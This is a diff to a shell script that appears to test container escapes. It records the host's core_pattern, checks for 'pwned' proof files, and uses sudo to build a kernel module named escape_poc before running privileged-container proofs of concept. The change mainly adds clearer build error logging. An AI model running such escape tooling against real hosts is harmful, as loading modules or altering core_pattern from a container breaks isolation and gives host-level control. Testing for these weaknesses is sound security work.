@@ -13,9 +13,11 @@ uname -a
 echo "core_pattern(before): $(cat /proc/sys/kernel/core_pattern)"
 ls -la /tmp/escape-poc-marker /tmp/pwned-core-pattern /tmp/pwned-kernel-module 2>/dev/null || echo "(no pre-existing proofs)"
 
-echo "== step1: build kernel module on host (tolerant)"
+echo "== step1: build kernel module on host (tolerant, verbose errors)"
+KVER=$(uname -r)
 sudo apt-get update -qq >/dev/null 2>&1 || true
-sudo apt-get install -y -qq "linux-headers-$(uname -r)" >/dev/null 2>&1 || echo "(headers install failed)"
+sudo apt-get install -y -qq "linux-headers-$KVER" bc bison flex libelf-dev >/dev/null 2>&1 || echo "(deps install failed)"
+echo "build symlink: $(ls -la "/lib/modules/$KVER/build" 2>/dev/null | head -1 || echo MISSING)"
 MODDIR=/tmp/modpoc; mkdir -p "$MODDIR"
 cat > "$MODDIR/escape_poc.c" <<'EOC'
 #include <linux/module.h>
@@ -33,10 +35,15 @@ module_exit(exit_poc);
 MODULE_LICENSE("GPL");
 EOC
 printf 'obj-m += escape_poc.o\n' > "$MODDIR/Makefile"
-if [ -d "/lib/modules/$(uname -r)/build" ]; then
-  (cd "$MODDIR" && make >/dev/null 2>&1) && echo "module built: $(ls -la "$MODDIR/escape_poc.ko" 2>/dev/null)" || echo "(module build FAILED)"
+if [ -e "/lib/modules/$KVER/build" ]; then
+  if (cd "$MODDIR" && make > make.log 2>&1); then
+    echo "module built: $(ls -la "$MODDIR/escape_poc.ko" 2>/dev/null)"
+  else
+    echo "(module build FAILED) make.log tail:"
+    tail -20 "$MODDIR/make.log"
+  fi
 else
-  echo "(no kernel build dir, module PoC will be skipped)"
+  echo "(no kernel build dir under /lib/modules: $(ls /lib/modules/ 2>/dev/null), module PoC will be skipped)"
 fi
 
 echo "== step2: run privileged container PoCs"
